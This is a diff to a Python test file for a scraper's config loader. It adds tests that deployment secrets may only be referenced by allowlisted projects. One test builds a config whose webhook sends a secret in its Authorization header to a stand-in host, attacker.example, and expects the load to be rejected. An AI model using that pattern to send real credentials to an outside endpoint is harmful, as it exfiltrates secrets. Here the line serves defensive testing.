@@ -9,6 +9,7 @@ import pytest
 import yaml
 from pydantic import ValidationError
 
+from scrapeyard.common.settings import get_settings
 from scrapeyard.config import (
     BrowserActionType,
     MapDetectionConfig,  # noqa: F401
@@ -154,6 +155,12 @@ class TestScrapeConfigValidation:
             "https://user:proxy-secret@proxy.example.com:8443",
         )
         monkeypatch.setenv("SCRAPEYARD_SECRET_WEBHOOK_AUTH", "Bearer hook-secret")
+        monkeypatch.setenv(
+            "SCRAPEYARD_SECRET_REFERENCE_ALLOWLIST",
+            '{"secret-ref":["SCRAPEYARD_SECRET_PROXY_URL",'
+            '"SCRAPEYARD_SECRET_WEBHOOK_AUTH"]}',
+        )
+        get_settings.cache_clear()
         config = load_config(
             """
 project: secret-ref
@@ -175,7 +182,12 @@ target:
         assert config.webhook is not None
         assert config.webhook.headers["Authorization"] == "Bearer hook-secret"
 
-    def test_missing_deployment_secret_reference_fails_closed(self):
+    def test_missing_deployment_secret_reference_fails_closed(self, monkeypatch):
+        monkeypatch.setenv(
+            "SCRAPEYARD_SECRET_REFERENCE_ALLOWLIST",
+            '{"secret-ref":["SCRAPEYARD_SECRET_MISSING"]}'
+        )
+        get_settings.cache_clear()
         with pytest.raises(ValueError, match="SCRAPEYARD_SECRET_MISSING"):
             load_config(
                 """
@@ -186,6 +198,72 @@ target:
   browser:
     extra_headers:
       Authorization: ${SCRAPEYARD_SECRET_MISSING}
+  selectors:
+    title: h1
+"""
+            )
+
+    def test_deployment_secret_references_are_denied_without_project_allowlist(
+        self,
+        monkeypatch,
+    ):
+        monkeypatch.setenv("SCRAPEYARD_SECRET_CROSS_PROJECT", "Bearer exposed")
+        with pytest.raises(ValueError, match="not allowed for project 'alpha'"):
+            load_config(
+                """
+project: alpha
+name: denied
+webhook:
+  url: https://attacker.example/callback
+  headers:
+    Authorization: ${SCRAPEYARD_SECRET_CROSS_PROJECT}
+target:
+  url: https://example.com
+  selectors:
+    title: h1
+"""
+            )
+
+    def test_global_deployment_secret_allowlist_applies_to_every_project(
+        self,
+        monkeypatch,
+    ):
+        monkeypatch.setenv("SCRAPEYARD_SECRET_SHARED", "shared-value")
+        monkeypatch.setenv(
+            "SCRAPEYARD_SECRET_REFERENCE_ALLOWLIST",
+            '{"*":["SCRAPEYARD_SECRET_SHARED"]}',
+        )
+        get_settings.cache_clear()
+        config = load_config(
+            """
+project: alpha
+name: shared
+target:
+  url: https://example.com
+  browser:
+    extra_headers:
+      X-Shared: ${SCRAPEYARD_SECRET_SHARED}
+  selectors:
+    title: h1
+"""
+        )
+        assert config.target is not None
+        assert config.target.browser.extra_headers["X-Shared"] == "shared-value"
+
+    def test_project_cannot_be_derived_from_a_secret_reference(self, monkeypatch):
+        monkeypatch.setenv("SCRAPEYARD_SECRET_PROJECT", "alpha")
+        monkeypatch.setenv(
+            "SCRAPEYARD_SECRET_REFERENCE_ALLOWLIST",
+            '{"alpha":["SCRAPEYARD_SECRET_PROJECT"]}',
+        )
+        get_settings.cache_clear()
+        with pytest.raises(ValueError, match="project must be a literal string"):
+            load_config(
+                """
+project: ${SCRAPEYARD_SECRET_PROJECT}
+name: hidden-project
+target:
+  url: https://example.com
   selectors:
     title: h1
 """
